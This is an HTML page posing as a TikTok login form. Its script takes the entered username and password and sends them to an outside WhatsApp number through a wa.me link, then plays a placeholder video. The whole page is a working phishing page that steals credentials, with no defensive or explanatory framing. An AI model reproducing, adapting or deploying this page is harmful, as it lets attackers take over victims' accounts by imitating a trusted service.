<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f8f8f8;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #ee2c2c;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        video {
            width: 100%;
            height: auto;
            display: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Login to TikTok</h2>
    <input type="text" id="username" placeholder="Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <button onclick="login()">Login</button>
</div>

<video id="videoPlayer" controls>
    <source src="your-video-url.mp4" type="video/mp4">
    Your browser does not support the video tag.
</video>

<script>
function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send login details to WhatsApp
    const whatsappMessage = `Username: ${username}\nPassword: ${password}`;
    window.location.href = `https://wa.me/0113572705?text=${encodeURIComponent(whatsappMessage)}`;

    // Play the video
    const videoPlayer = document.getElementById('videoPlayer');
    videoPlayer.style.display = 'block';
    videoPlayer.play();
}
</script>

</body>
</html>
